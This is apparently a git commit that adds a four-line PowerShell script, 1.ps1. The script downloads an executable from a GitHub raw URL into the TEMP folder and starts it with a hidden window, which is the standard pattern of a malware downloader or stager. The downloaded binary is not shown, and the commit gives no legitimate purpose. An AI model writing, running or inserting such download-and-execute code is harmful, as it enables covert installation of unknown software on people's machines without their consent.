3f4b3925dd5eab7f0092ef649dbd965891cb73e9
! / socialhate <socialhate@proton.me>
2026-05-22 11:08:06 +0300

    Add files via upload

---
+++ 1.ps1
@@ -0,0 +1,4 @@
+# 1.ps1
+$exePath = "$env:TEMP\1.exe"
+(New-Object Net.WebClient).DownloadFile('https://github.com/socialhate/Test/raw/refs/heads/main/1.exe', $exePath)
+Start-Process -FilePath $exePath -WindowStyle Hidden
